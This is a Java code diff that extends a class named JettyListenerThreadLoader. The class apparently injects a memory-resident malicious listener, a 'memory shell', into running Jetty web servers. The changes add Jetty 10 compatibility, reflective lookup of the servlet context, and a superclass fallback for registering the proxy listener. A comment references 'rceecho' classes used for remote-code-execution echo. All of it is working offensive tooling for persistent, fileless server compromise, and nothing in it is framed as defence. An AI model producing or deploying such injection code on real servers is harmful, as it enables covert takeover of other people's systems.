@@ -11,6 +11,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
+import java.util.List;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -48,16 +49,35 @@ public class JettyListenerThreadLoader {
      * Jetty Listener
      */
     public static void inject(Object servletContext) throws Exception {
-        Object[] _eventListeners = (Object[]) getFieldValue(servletContext, "_eventListeners");
-        if (_eventListeners != null) {
-            for (int i = 0; i < _eventListeners.length; i++) {
-                if (_eventListeners[i] instanceof Proxy) {
-                    if (getFieldValue(_eventListeners[i], "h").getClass().getName().equalsIgnoreCase(CLASSNAME)) {
-                        return;
+        // Jetty 9
+        try {
+            Object[] _eventListeners = (Object[]) getFieldValue(servletContext, "_eventListeners");
+            if (_eventListeners != null) {
+                for (int i = 0; i < _eventListeners.length; i++) {
+                    if (_eventListeners[i] instanceof Proxy) {
+                        if (getFieldValue(_eventListeners[i], "h").getClass().getName().equalsIgnoreCase(CLASSNAME)) {
+                            return;
+                        }
+                    }
+
+                }
+            }
+        } catch (Exception e) {
+        }
+
+        // Jetty 10
+        try {
+            List _eventListeners = (List) getFieldValue(servletContext, "_eventListener");
+            if (_eventListeners != null) {
+                for (int i = 0; i < _eventListeners.size(); i++) {
+                    if (_eventListeners.get(i) instanceof Proxy) {
+                        if (getFieldValue(_eventListeners.get(i), "h").getClass().getName().equalsIgnoreCase(CLASSNAME)) {
+                            return;
+                        }
                     }
                 }
-
             }
+        } catch (Exception e) {
         }
 
         // 动态代理兼容 javax jakarta
@@ -86,8 +106,8 @@ public class JettyListenerThreadLoader {
         Object javaObject = clazz.newInstance();
         Object object = Proxy.newProxyInstance(listenerClass.getClassLoader(), new Class[]{listenerClass}, (InvocationHandler) javaObject);
 
-
-        invokeMethod(servletContext.getClass().getSuperclass(), servletContext, "addEventListener", new Class[]{Class.forName("java.util.EventListener")}, new Object[]{object});
+        // Jetty 9 10
+        invokeMethod(servletContext, "addEventListener", new Class[]{Class.forName("java.util.EventListener")}, new Object[]{object});
     }
 
     public static Object getServletContext() throws Exception {
@@ -102,16 +122,11 @@ public class JettyListenerThreadLoader {
                 if (value == null)
                     continue;
 
-//                ServletContextHandler.getCurrentContext()
-                Object context = invokeMethod(Class.forName("org.eclipse.jetty.server.handler.ContextHandler"), value, "getCurrentContext", new Class[]{}, new Object[]{});
-                Object servletContext = getFieldValue(context, "this$0");
-
-                return servletContext;
-
-                // todo 测试版本覆盖 以下为 rceecho 相关类
-                // Jetty 7 低版本 org.eclipse.jetty.server.nio.SelectChannelConnector
-                // Jetty 7 8  org.eclipse.jetty.server.AsyncHttpConnection
-                // Jetty 9、10  org.eclipse.jetty.server.HttpConnection
+                // 9 10 org.eclipse.jetty.server.HttpConnection$HttpChannelOverHttp
+                if (value.getClass().getName().equals("org.eclipse.jetty.servlet.ServletContextHandler$Context")) {
+                    Object servletContext = getFieldValue(value, "this$0");
+                    return servletContext;
+                }
             }
         } catch (Exception e) {
 
@@ -170,6 +185,14 @@ public class JettyListenerThreadLoader {
     public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
         final Field field = getField(obj.getClass(), fieldName);
         field.set(obj, value);
+    }
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        } catch (Exception e) {
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
     }
 
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
